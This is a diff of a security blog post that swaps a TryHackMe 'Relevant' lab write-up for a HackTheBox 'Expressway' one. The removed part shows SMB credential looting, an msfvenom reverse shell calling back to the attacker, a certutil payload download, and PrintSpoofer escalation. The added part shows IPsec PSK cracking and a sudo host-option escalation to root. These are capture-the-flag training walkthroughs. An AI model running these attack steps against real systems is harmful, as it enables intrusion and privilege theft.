@@ -1,391 +1,220 @@
 ---
 layout: post
-title: Relevant
-subtitle: TryHackMe Writeup - Relevant
-description: Enumerate SMB to retrieve files and passwords, then upload files to gain a shell.
-image: https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg
-optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg
-category: tryhackme
+title: Expressway
+subtitle: HackTheBox - Expressway
+description: Enumerate services, scan TCP/UDP ports, exploit IPsec vulnerabilities, and escalate privileges to capture flags.
+image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
+optimized_image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
 tags:
-  - TryHackMe
+  - HackTheBox
+  - IPsec Vulnerability
   - Privilege Escalation
-  - SMB Exploitation
+  - Find Flags
 author: Mustafa Altayeb
-date: 2025-09-12 00:00
+date: 2025-10-07 00:00
 paginate: true
-
 ---
 
-# Relevant - TryHackMe Writeup
+# Expressway
+[Expressway on HackTheBox](https://app.hackthebox.com/machines/736)
 
-[Relevant](https://tryhackme.com/room/relevant)
-
----
-
-![Relevant Banner](https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg)
+![Expressway Banner](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png)
 
 ## Objectives
-1. Gain initial access to the Windows server using SMB.
-2. Enumerate privilege escalation vectors using manual commands.
-3. Run a script to impersonate a token and gain administrator privileges.
-
----
+1. Enumerate UDP/TCP ports
+2. Extract SSH credentials via IPsec
+3. Gain initial access through SSH
+4. Identify privilege escalation vectors
+5. Capture user and root flags
 
 ## Reconnaissance
 
 ### Nmap Scan
-Ran an Nmap scan to identify open ports:
-
+Initial TCP port scan:
 ```bash
-💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.12 | 🥷 VPN IP ➜ 10.14.109.66
-👀 ➜ ~/thm_machines/Relevant nmap -p1-65535 --min-rate 1000 10.10.134.54
+nmap -p1-65535 --min-rate 1000 10.10.11.87
 ```
 
 **Results**:
-```bash
-PORT      STATE SERVICE
-80/tcp    open  http
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-445/tcp   open  microsoft-ds
-3389/tcp  open  ms-wbt-server
-49663/tcp open  unknown
-49666/tcp open  unknown
-49667/tcp open  unknown
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
 ```
 
-Identified ports: `80, 135, 139, 445, 3389, 49663, 49666, 49667`
-
-Ran a detailed Nmap scan to identify services on these ports:
-
+UDP port scan:
 ```bash
-💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.12 | 🥷 VPN IP ➜ 10.14.109.66
-👀 ➜ ~/thm_machines/Relevant nmap -sCV -p 80,135,445,3389,49663,49666,49667 10.10.134.54
+nmap -p1-65535 -sU --min-rate 1000 10.10.11.87
 ```
 
 **Results**:
-```bash
-PORT      STATE SERVICE       VERSION
-80/tcp    open  http          Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS/10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-title: IIS Windows Server
-135/tcp   open  msrpc         Microsoft Windows RPC
-445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
-3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-|_ssl-date: 2025-09-13T19:35:16+00:00; 0s from scanner time.
-| ssl-cert: Subject: commonName=Relevant
-| Not valid before: 2025-09-12T19:22:58
-|_Not valid after:  2026-03-14T19:22:58
-| rdp-ntlm-info: 
-|   Target_Name: RELEVANT
-|   NetBIOS_Domain_Name: RELEVANT
-|   NetBIOS_Computer_Name: RELEVANT
-|   DNS_Domain_Name: Relevant
-|   DNS_Computer_Name: Relevant
-|   Product_Version: 10.0.14393
-|_  System_Time: 2025-09-13T19:34:36+00:00
-49663/tcp open  http          Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: IIS Windows Server
-| http-methods: 
-|_  Potentially risky methods: TRACE
-49666/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb-os-discovery: 
-|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
-|   Computer name: Relevant
-|   NetBIOS computer name: RELEVANT\x00
-|   Workgroup: WORKGROUP\x00
-|_  System time: 2025-09-13T12:34:40-07:00
-|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-time: 
-|   date: 2025-09-13T19:34:38
-|_  start_date: 2025-09-13T19:22:59
+```
+PORT      STATE         SERVICE
+9/udp     open|filtered discard
+68/udp    open|filtered dhcpc
+69/udp    open|filtered tftp
+500/udp   open          isakmp
+520/udp   open|filtered route
+626/udp   open|filtered serialnumberd
+997/udp   open|filtered maitrd
+1030/udp  open|filtered iad1
+3703/udp  open|filtered adobeserver-3
+4500/udp  open|filtered nat-t-ike
+49186/udp open|filtered unknown
+49192/udp open|filtered unknown
+49200/udp open|filtered unknown
 ```
 
 **Key Findings**:
-- **Port 80**: Microsoft IIS httpd 10.0
-- **Port 135**: Microsoft Windows RPC
-- **Port 139**: Microsoft Windows NetBIOS-SSN
-- **Port 445**: Windows Server 2016 Standard Evaluation 14393 (workgroup: WORKGROUP)
-- **Port 3389**: Microsoft Terminal Services
-- **Port 49663**: Microsoft IIS httpd 10.0
-- **Ports 49666, 49667**: Microsoft Windows RPC
+- **Port 500/UDP**: Running ISAKMP (IPsec VPN). All other ports filtered except 500.
 
-### Web Enumeration
-Visited the web server on port 80:
+## IPsec VPN Enumeration
 
-![Web Server](/assets/TryHackMeRoomsImage/Relevant/image.png)
-
-### SMB Enumeration
-Enumerated SMB shares:
-
+Scan IPsec service:
 ```bash
-smbclient -L \\\\10.10.134.54
+nmap -sU -p 500 --script ike-version 10.10.11.87
 ```
 
 **Results**:
-```bash
-Sharename       Type      Comment
----------       ----      -------
-ADMIN$          Disk      Remote Admin
-C$              Disk      Default share
-IPC$            IPC       Remote IPC
-nt4wrksv        Disk
+```
+PORT    STATE SERVICE
+500/udp open  isakmp
+| ike-version: 
+|   attributes: 
+|     XAUTH
+|_    Dead Peer Detection v1.0
 ```
 
-**Key Finding**:
-- **nt4wrksv**: Disk accessible without a password.
+**Findings**:
+- XAUTH and IKE version 1.0 detected.
 
-### Accessing `nt4wrksv` Share
-Connected to the `nt4wrksv` share:
-
+### Identify VPN Vendor & Configuration
 ```bash
-smbclient //10.10.134.54/nt4wrksv
+ike-scan -M -A 10.10.11.87
 ```
 
 **Results**:
-```bash
-Password for [WORKGROUP\root]:
-Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Sat Jul 25 17:46:04 2020
-  ..                                  D        0  Sat Jul 25 17:46:04 2020
-  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
-
-                7735807 blocks of size 4096. 5135954 blocks available
+```
+DR=(CKY-R=dc48124ff9415a5d)
+SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+KeyExchange(128 bytes)
+Nonce(32 bytes)
+ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+VID=09002689dfd6b712 (XAUTH)
+VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+Hash(20 bytes)
 ```
 
-Found a file named `passwords.txt` and downloaded it using the `get` command.
+**Findings**:
+- SSH user: `ike@expressway.htb`
 
-**Content of `passwords.txt`**:
+### Extract VPN Group Name & PSK Hash
 ```bash
-[User Passwords - Encoded]
-Qm9iIC0gIVBAJCRXMHJEITEyMw==
-QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+ike-scan -A --pskcrack 10.10.11.87
 ```
 
-The contents appeared to be Base64-encoded. Decoded them:
+**Results**:
+```
+10.10.11.87 Aggressive Mode Handshake returned
+HDR=(CKY-R=dcbe8baace3526f4)
+SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+KeyExchange(128 bytes)
+Nonce(32 bytes)
+ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+VID=09002689dfd6b712 (XAUTH)
+VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+Hash(20 bytes)
+IKE PSK parameters:
+eaed8f70947e12fd6067583f9bf689fa787958c4c1f268c416e87ffaf58091972cd2fb68abb7fc72760df90919220443dc5999323373d7017333d2350d89591a56b7bb5fa4bf926f4ef6515a6ba649cc2d6363806bda1156f327a66d15ce729ae4f4bfd4b7adfb06116f6bd3d7a7910398c0d49d3d2ff682ae1bb28a8ca1aad8:366a903bcde43282003ba2039824c675a772350bfcc123ce83bc5f51e422403b2de73fc7e67905b7d3cc5cd856c074770f4c2418fab912c263cdb5b0969fcf68dff33fdcdc007c32a2087340e3982788729b4c6ed74e91454a14ae775440fc0671891da8622fb898d5c5fd3326ea41f2ae0786c629fcf84241e4b492da11144b:dcbe8baace3526f4:7a0abdc5d7de2ce4:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:0bdf118d960e20e50e150b712ec195d1eb36273b:df9b7b0dec195f4609339273ea7eba684c86a2cd76a2e4a306827bf5ab53dc14:6bc5d6a1228177e114af9539ffd18c5aeb014df3
+```
 
+Crack the PSK hash:
 ```bash
-💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
-👀 ➜ ~ cat passwords.txt
-[User Passwords - Encoded]
-Qm9iIC0gIVBAJCRXMHJEITEyMw==
-QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
-💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
-👀 ➜ ~ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
-Bob - !P@$$W0rD!123
-💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
-👀 ➜ ~ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
-Bill - Juw4nnaM4n420696969!$$$
+psk-crack -d /usr/share/wordlists/rockyou.txt hash1.txt
+```
+
+**Results**:
+```
+Starting psk-crack [ike-scan 1.9.6]
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash 6bc5d6a1228177e114af9539ffd18c5aeb014df3
 ```
 
 **Credentials**:
-- Bob: `!P@$$W0rD!123`
-- Bill: `Juw4nnaM4n420696969!$$$`
+- User: `ike@expressway.htb`
+- Password: `freakingrockstarontheroad`
 
-These credentials can be used to log in via RDP on port 3389, identified during the Nmap scan. Additionally, based on experience, the SMB share is likely accessible via the web server on port 49663 (from Nmap results).
-
-## Gaining Access
-Created a reverse shell using `msfvenom`:
-
+## Initial Access via SSH
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.109.66 LPORT=4444 -f aspx -o rev.aspx
+ssh ike@10.10.11.87
 ```
 
-Uploaded the shell to the `nt4wrksv` share:
-
-```bash
-💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
-👀 ➜ ~ smbclient //10.10.134.54/nt4wrksv
-Password for [WORKGROUP\root]:
-Try "help" to get a list of possible commands.
-smb: \> put rev.aspx
-putting file rev.aspx as \rev.aspx (13.1 kb/s) (average 13.1 kb/s)
-smb: \>
+**Output**:
+```
+💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.10.16.32
+ike@10.10.11.87's password: 
+Last login: Tue Oct 7 17:06:04 BST 2025 from 10.10.14.115
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+ike@expressway:~$
 ```
 
-Set up a listener on port 4444:
-
+### User Flag
 ```bash
-nc -nlvp 4444
-```
-
-Accessed the shell via the web server on port 49663:
-
-```bash
-http://10.10.134.54:49663/nt4wrksv/rev.aspx
-```
-
-Successfully gained access to the machine:
-
-```bash
-💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
-👀 ➜ ~ nc -nlvp 4444
-listening on [any] 4444 ...
-connect to [10.14.109.66] from (UNKNOWN) [10.10.134.54] 49869
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-c:\windows\system32\inetsrv>whoami
-whoami
-iis apppool\defaultapppool
-```
-
-## User Flag
-Located the user flag:
-
-```bash
-c:\Users\Bob\Desktop>dir
- Volume in drive C has no label.
- Volume Serial Number is AC3C-5CB5
-
- Directory of c:\Users\Bob\Desktop
-
-07/25/2020  02:04 PM    <DIR>          .
-07/25/2020  02:04 PM    <DIR>          ..
-07/25/2020  08:24 AM                35 user.txt
-               1 File(s)             35 bytes
-               2 Dir(s)  21,034,422,272 bytes free
-
-c:\Users\Bob\Desktop>more user.txt
-THM{fdk4ka34vk346ksxfr21tg789ktf45}
+ike@expressway:~$ ls
+es.sh user.txt
+ike@expressway:~$ cat user.txt
+6e89cbec6...
 ```
 
 ## Privilege Escalation
 
-### System Enumeration
-Checked privileges:
-
+### System Exploration
+Found a `README` file in `/var/log`:
 ```bash
-c:\Users\Bob\Desktop>whoami /priv
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                               State
-============================= ========================================= ========
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
-SeAuditPrivilege              Generate security audits                  Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled
-SeCreateGlobalPrivilege       Create global objects                     Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+ike@expressway:/var/log$ cat README
+You are looking for the traditional text log files in /var/log, and they are gone?
+Here's an explanation on what's going on:
+You are running a systemd-based OS where traditional syslog has been replaced with the Journal...
 ```
 
-**Key Finding**:
-- `SeImpersonatePrivilege`: Enabled, indicating a potential privilege escalation vector.
-
-Found a script to exploit this privilege: [PrintSpoofer.exe](https://github.com/dievus/printspoofer).
-
-Set up a web server to transfer the script:
-
+Log analysis revealed an internal hostname:
 ```bash
-python3 -m http.server 8888
+753229688.902 0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
 ```
 
-Attempted to download the script using `certutil.exe`, but it failed:
-
+### Sudo Vulnerability
+Check sudo version:
 ```bash
-c:\inetpub\wwwroot>certutil -urlcache -f http://10.14.109.66:8888/PrintSpoofer.exe rev.exe
-****  Online  ****
-CertUtil: -URLCache command FAILED: 0x80072ee4 (WinHttp: 12004 ERROR_WINHTTP_INTERNAL_ERROR)
-CertUtil: An internal error occurred in the Microsoft Windows HTTP Services
+ike@expressway:/$ sudo -V
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
 ```
 
-Instead, uploaded the script via SMB:
+**Vulnerability**: Sudo 1.9.17 Host Option - Elevation of Privilege
+- Allows execution of commands permitted by a remote host rule on the local system.
 
+Exploit using the internal hostname:
 ```bash
-💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
-👀 ➜ ~ smbclient \\\\10.10.134.54\\nt4wrksv
-Password for [WORKGROUP\root]:
-Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Sat Sep 13 15:42:34 2025
-  ..                                  D        0  Sat Sep 13 15:42:34 2025
-  myservice.aspx                      A      460  Sat Sep 13 15:39:39 2025
-  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
-  rev.aspx                            A     3405  Sat Sep 13 15:42:34 2025
-
-                7735807 blocks of size 4096. 5135281 blocks available
-smb: \> put PrintSpoofer.exe
-putting file PrintSpoofer.exe as \PrintSpoofer.exe (67.8 kb/s) (average 67.8 kb/s)
+ike@expressway:/$ sudo -h offramp.expressway.htb -i
+root@expressway:~#
 ```
 
-Navigated to the `nt4wrksv` directory to access the script:
-
+### Root Flag
 ```bash
-c:\inetpub\wwwroot>cd nt4wrksv
-
-c:\inetpub\wwwroot\nt4wrksv>dir
- Volume in drive C has no label.
- Volume Serial Number is AC3C-5CB5
-
- Directory of c:\inetpub\wwwroot\nt4wrksv
-
-09/13/2025  01:10 PM    <DIR>          .
-09/13/2025  01:10 PM    <DIR>          ..
-07/25/2020  08:15 AM                98 passwords.txt
-09/13/2025  01:10 PM            27,136 PrintSpoofer.exe
-09/13/2025  12:42 PM             3,405 rev.aspx
-               4 File(s)         31,099 bytes
-               2 Dir(s)  21,034,082,304 bytes free
+root@expressway:~# ls
+root.txt
+root@expressway:~# cat root.txt
+2f5481da2fed7...
 ```
 
-Ran the script:
-
-```bash
-.\PrintSpoofer.exe -i -c cmd
-[+] Found privilege: SeImpersonatePrivilege
-[+] Named pipe listening...
-[+] CreateProcessAsUser() OK
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>whoami
-nt authority\system
-```
-
-Successfully escalated to `NT AUTHORITY\SYSTEM`.
-
-## Root Flag
-Located the root flag:
-
-```bash
-C:\Users\Administrator\Desktop>dir
- Volume in drive C has no label.
- Volume Serial Number is AC3C-5CB5
-
- Directory of C:\Users\Administrator\Desktop
-
-07/25/2020  08:24 AM    <DIR>          .
-07/25/2020  08:24 AM    <DIR>          ..
-07/25/2020  08:25 AM                35 root.txt
-               1 File(s)             35 bytes
-               2 Dir(s)  21,034,082,304 bytes free
-
-C:\Users\Administrator\Desktop>more root.txt
-THM{1fk5kf469devly1gl320zafgl345pv}
-```
-
----
+## Conclusion
+Successfully exploited an IPsec VPN to gain SSH credentials, accessed the system as user `ike`, and escalated privileges to root using a sudo vulnerability tied to an internal hostname.
 
 <iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>
 
-Follow me through these links:
-
----
+Follow me:
+- [Linkedin](https://www.linkedin.com/in/t4t4r1s/)
+- [Link 2](https://x.com/T4T4R1S)
+```
